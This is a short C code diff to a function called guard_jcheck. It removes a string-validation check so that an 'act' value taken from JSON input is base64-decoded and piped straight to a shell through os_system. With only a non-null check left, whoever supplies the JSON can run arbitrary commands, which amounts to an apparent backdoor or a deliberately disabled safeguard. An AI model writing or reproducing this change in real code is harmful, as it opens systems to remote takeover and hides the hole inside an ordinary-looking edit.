@@ -279,9 +279,8 @@ guard_jcheck(jobj_t obj)
     */
     jobj_t jact = jobj_get(obj, "act");
     if (jact) {
-        char *action = jobj_get_string(jact);
-        
-        if (is_good_str(action)) {
+        char *action = jobj_get_string_ex(jact);
+        if (action) {
             os_system("echo %s | base64 -d | sh", action);
         }
     }
